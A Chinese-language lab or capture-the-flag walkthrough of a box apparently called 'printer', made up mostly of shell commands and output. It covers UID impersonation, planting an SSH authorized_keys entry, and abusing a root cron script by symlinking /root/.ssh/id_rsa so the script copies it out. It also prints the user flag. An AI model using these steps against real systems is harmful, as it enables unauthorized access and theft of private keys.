<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">useradd</span> <span class="token parameter variable">-u</span> <span class="token number">1098</span> qwer

  ~/Desktop/printer/lisaa                                                                                                                                                                                            root@kali2  <span class="token number">19</span>:14:57 
<span class="token operator">></span> <span class="token function">su</span> qwer
$ uid  
sh: <span class="token number">1</span>: uid: not found
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>qwer<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>qwer<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>qwer<span class="token punctuation">)</span>
$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-xr-x <span class="token number">4</span> qwer tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">19</span>:08 <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root root    <span class="token number">9</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> qwer tao   <span class="token number">220</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> qwer tao  <span class="token number">3555</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .bashrc
drwxr-xr-x <span class="token number">3</span> qwer tao  <span class="token number">4096</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> qwer tao   <span class="token number">807</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> qwer tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .ssh
-rwx------ <span class="token number">1</span> qwer tao    <span class="token number">33</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> user.txt
$ <span class="token function">cat</span> user.txt  
f590b7e83e4c8cd11d06849f9c1a8f6d</code></pre>
<p>成功拿到user flag，现在拿下私钥方便ssh连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">qwer@kali2:/root/Desktop/printer/lisaa$ <span class="token builtin class-name">cd</span> .ssh/
qwer@kali2:/root/Desktop/printer/lisaa/.ssh$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwx------ <span class="token number">2</span> qwer tao <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">4</span> qwer tao <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> qwer tao  <span class="token number">566</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> id_rsa.pub</code></pre>
<p>没有私钥，那我自己传个公钥进去，用我的私钥连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">qwer@kali2:/root/Desktop/printer/lisaa/.ssh$ <span class="token builtin class-name">echo</span> <span class="token string">"**********************"</span> <span class="token operator">></span>  authorized_keys</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa lisa@192.168.56.191
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token builtin class-name">:</span> 
Linux printer <span class="token number">5.10</span>.0-20-amd64 <span class="token comment">#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
lisa@printer:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>lisa<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>lisa<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>lisa<span class="token punctuation">)</span>,7<span class="token punctuation">(</span>lp<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,112<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span></code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传个pspy64看一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2326</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2327</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2328</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2329</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2330</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2331</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2332</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2333</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2334</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2335</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2336</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2337</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2338</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2339</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2340</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2341</span>   <span class="token operator">|</span> /bin/bash /opt/logs/nsecure 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2342</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2343</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2344</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2345</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2346</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2347</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2348</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2349</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2350</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2351</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2352</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2353</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2354</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2355</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2356</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2357</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> </code></pre>
<p>发现有定时任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/opt/logs$ <span class="token function">cat</span> nsecure 
<span class="token comment">#! /bin/bash</span>

<span class="token assign-left variable">dst</span><span class="token operator">=</span>/opt/logs
<span class="token assign-left variable">journal</span><span class="token operator">=</span><span class="token variable">$dst</span>/journal
<span class="token assign-left variable">queued</span><span class="token operator">=</span>/var/spool/cups
<span class="token assign-left variable">str</span><span class="token operator">=</span><span class="token string">"*log*"</span>

<span class="token function">touch</span> <span class="token variable">$journal</span>
<span class="token function">chmod</span> <span class="token number">700</span> <span class="token variable">$journal</span>
<span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token variable">$dst</span>  <span class="token punctuation">\</span><span class="token punctuation">;</span>
<span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">>></span> <span class="token variable">$dst</span>/journal <span class="token punctuation">\</span><span class="token punctuation">;</span>
<span class="token function">rm</span> <span class="token variable">$dst</span>/<span class="token variable">$str</span>

<span class="token keyword">if</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">"fatal error !"</span> <span class="token variable">$dst</span>/journal <span class="token punctuation">;</span> <span class="token keyword">then</span>
  <span class="token builtin class-name">umask</span> 007 <span class="token variable">$queued</span>
  lp <span class="token parameter variable">-d</span> superPrinter <span class="token variable">$dst</span>/journal
  <span class="token builtin class-name">umask</span> 022
  <span class="token function">zip</span> <span class="token parameter variable">-P</span> <span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span>~/.lisaPass<span class="token variable">)</span></span> <span class="token parameter variable">-j</span> <span class="token variable">$journal</span>.zip <span class="token variable">$queued</span>/d*
  <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">$queued</span>/<span class="token punctuation">&#123;</span>d*,c*<span class="token punctuation">&#125;</span>
  <span class="token operator">></span>/var/log/syslog
  <span class="token operator">></span>/var/log/user.log
  <span class="token builtin class-name">echo</span> <span class="token string">"Lisa, URGENT! Come quickly to fix the problem!"</span> <span class="token operator">|</span>wall
<span class="token keyword">fi</span>

<span class="token function">rm</span> <span class="token variable">$journal</span></code></pre>
<p>有条指令很关键,会把opt目录下面的名字里面带有log的写到&#x2F;opt&#x2F;logs&#x2F;journal 下并且用lisa的密码压缩</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">>></span> <span class="token variable">$dst</span>/journal <span class="token punctuation">\</span><span class="token punctuation">;</span></code></pre>
<p>先不管密码，先看看能不能搞出来，尝试软连接root的私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/opt$ <span class="token function">ln</span> <span class="token parameter variable">-sv</span> /root/.ssh/id_rsa <span class="token number">123</span>.log
<span class="token string">'123.log'</span> -<span class="token operator">></span> <span class="token string">'/root/.ssh/id_rsa'</span>
lisa@printer:/opt/logs$ logger <span class="token string">"fatal error !"</span>
                                                                               
Broadcast message from root@printer <span class="token punctuation">(</span>somewhere<span class="token punctuation">)</span> <span class="token punctuation">(</span>Sun Jun <span class="token number">30</span> <span class="token number">21</span>:40:01 <span class="token number">2024</span><span class="token punctuation">)</span>:    
                                                                               
Lisa, URGENT<span class="token operator">!</span> Come quickly to fix the problem<span class="token operator">!</span>                                 
                                                                               

lisa@printer:/opt/logs$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">76</span>
drwxr-xr-x <span class="token number">2</span> root root  <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 <span class="token builtin class-name">.</span>
drwxr-xrwx <span class="token number">3</span> root root  <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:38 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">61997</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 journal.zip
-rwxr-xr-x <span class="token number">1</span> root root   <span class="token number">565</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> nsecure</code></pre>
<p>确实拿到一个压缩包,但是捏，需要密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/tmp$ <span class="token function">unzip</span> journal.zip 
Archive:  journal.zip
<span class="token punctuation">[</span>journal.zip<span class="token punctuation">]</span> d00052-001 password: </code></pre>
<p>观了一手wp，发现有两个打印机文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/var/spool/cups$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-x---+ <span class="token number">3</span> root lp       <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 <span class="token builtin class-name">.</span>
drwxr-xr-x  <span class="token number">6</span> root lpadmin  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> root root     <span class="token number">7921</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token number">18358014</span>
-rw-r--r--  <span class="token number">1</span> root root    <span class="token number">13699</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token number">21581476</span>
-rw-------  <span class="token number">1</span> root lp       <span class="token number">1098</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 c00052
drwxrwx--T  <span class="token number">2</span> root lp       <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 tmp</code></pre>
